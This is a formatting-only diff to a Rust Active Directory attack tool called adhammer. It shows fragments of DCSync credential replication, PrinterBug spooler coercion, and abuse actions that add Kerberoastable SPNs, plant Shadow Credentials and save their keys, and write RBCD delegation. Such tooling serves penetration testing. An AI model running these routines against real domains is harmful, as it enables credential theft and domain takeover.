@@ -1564,10 +1564,7 @@ async fn dcsync_all(a: &DcsyncArgs) -> Result<()> {
         }
     }
 
-    eprintln!(
-        "[+] {} accounts scheduled for replication…",
-        users.len()
-    );
+    eprintln!("[+] {} accounts scheduled for replication…", users.len());
 
     // 2. DCSync each over one sealed DRSUAPI session.
     let mut sess = DrsSession::bind(&a.host, &a.domain, &a.user, &a.password).await?;
@@ -1619,8 +1616,8 @@ async fn dcsync_all(a: &DcsyncArgs) -> Result<()> {
 /// 5. Empty string — downstream code returns its own "needs password" error.
 fn resolve_secret(argv_value: &str, env_key: &str) -> Result<String> {
     if let Some(path) = argv_value.strip_prefix("@file:") {
-        let raw = std::fs::read_to_string(path)
-            .with_context(|| format!("read password file {path}"))?;
+        let raw =
+            std::fs::read_to_string(path).with_context(|| format!("read password file {path}"))?;
         // Strip a single trailing newline (Unix or Windows) — a file created with
         // `echo pw > pw.txt` invariably has one; passing it through would break the bind.
         return Ok(raw.trim_end_matches(['\n', '\r']).to_string());
@@ -1691,7 +1688,10 @@ mod resolve_secret_tests {
     fn file_ref_missing_file_is_an_error() {
         let err = resolve_secret("@file:/no/such/adhammer/pw.txt", "ADHAMMER_UNUSED").unwrap_err();
         let msg = format!("{err:#}");
-        assert!(msg.contains("read password file"), "unexpected error: {msg}");
+        assert!(
+            msg.contains("read password file"),
+            "unexpected error: {msg}"
+        );
     }
 }
 
@@ -2744,7 +2744,9 @@ async fn coerce(mut a: CoerceArgs) -> Result<()> {
                     println!("    {} spooler attempted auth to \\\\{}\\... (run a relay/listener to capture)", a.host, a.listener);
                 }
                 Err(e) => {
-                    println!("[-] PrinterBug failed/patched (spooler off or remote RPC blocked): {e}")
+                    println!(
+                        "[-] PrinterBug failed/patched (spooler off or remote RPC blocked): {e}"
+                    )
                 }
             }
         }
@@ -2793,7 +2795,8 @@ async fn coerce(mut a: CoerceArgs) -> Result<()> {
             };
             let pipe = smb.open_pipe(pipe_name).await?;
             let mut client =
-                CoerceClient::bind_sealed(&mut smb, pipe, &a.domain, &a.user, &a.password, &a.host).await?;
+                CoerceClient::bind_sealed(&mut smb, pipe, &a.domain, &a.user, &a.password, &a.host)
+                    .await?;
             match client.coerce(&a.listener).await {
                 Ok(status) => {
                     println!(
@@ -2898,8 +2901,12 @@ async fn abuse(mut a: AbuseArgs) -> Result<()> {
 
     match a.action {
         AbuseAction::AddSpn => {
-            c.add_value(&target_dn, "servicePrincipalName", &a.value).await?;
-            println!("[+] added SPN '{}' to {} — now Kerberoastable", a.value, a.target);
+            c.add_value(&target_dn, "servicePrincipalName", &a.value)
+                .await?;
+            println!(
+                "[+] added SPN '{}' to {} — now Kerberoastable",
+                a.value, a.target
+            );
         }
         AbuseAction::AddMember => {
             let member_dn = c.resolve_dn(&a.value).await?;
@@ -2923,11 +2930,18 @@ async fn abuse(mut a: AbuseArgs) -> Result<()> {
         AbuseAction::AddKeycred => {
             // Shadow Credentials: add a KeyCredential to the target's msDS-KeyCredentialLink.
             let kc = adhammer_kerberos::shadowcred::build_key_credential(&target_dn)?;
-            c.add_value(&target_dn, "msDS-KeyCredentialLink", &kc.dn_binary).await?;
+            c.add_value(&target_dn, "msDS-KeyCredentialLink", &kc.dn_binary)
+                .await?;
             let key_path = format!("{}.key.pem", a.target);
             std::fs::write(&key_path, &kc.private_key_pem)?;
-            println!("[+] added Shadow Credential to {} — key saved to {key_path}", a.target);
-            println!("    (Phase 2: PKINIT with this key to obtain a TGT as {})", a.target);
+            println!(
+                "[+] added Shadow Credential to {} — key saved to {key_path}",
+                a.target
+            );
+            println!(
+                "    (Phase 2: PKINIT with this key to obtain a TGT as {})",
+                a.target
+            );
         }
         AbuseAction::WriteRbcd => {
             // value = SID (S-1-...) or sAMAccountName of the principal to grant delegation.
@@ -2937,8 +2951,12 @@ async fn abuse(mut a: AbuseArgs) -> Result<()> {
                 c.resolve_sid(&a.value).await?
             };
             let sd = windows_sddl::build_rbcd_sd(&trustee);
-            c.write_binary(&target_dn, "msDS-AllowedToActOnBehalfOfOtherIdentity", sd).await?;
-            println!("[+] wrote RBCD on {} allowing {} to impersonate to it", a.target, a.value);
+            c.write_binary(&target_dn, "msDS-AllowedToActOnBehalfOfOtherIdentity", sd)
+                .await?;
+            println!(
+                "[+] wrote RBCD on {} allowing {} to impersonate to it",
+                a.target, a.value
+            );
         }
         AbuseAction::Pkinit => unreachable!("pkinit handled above the LDAP-connect block"),
     }
@@ -5043,9 +5061,13 @@ async fn scan(a: ScanArgs) -> Result<()> {
 
     match &a.out {
         Some(path) if path != "-" => {
-            std::fs::write(path, &body)
-                .with_context(|| format!("write scan report → {path}"))?;
-            eprintln!("[+] {} report written → {} ({} bytes)", format, path, body.len());
+            std::fs::write(path, &body).with_context(|| format!("write scan report → {path}"))?;
+            eprintln!(
+                "[+] {} report written → {} ({} bytes)",
+                format,
+                path,
+                body.len()
+            );
         }
         _ => {
             println!("{body}");
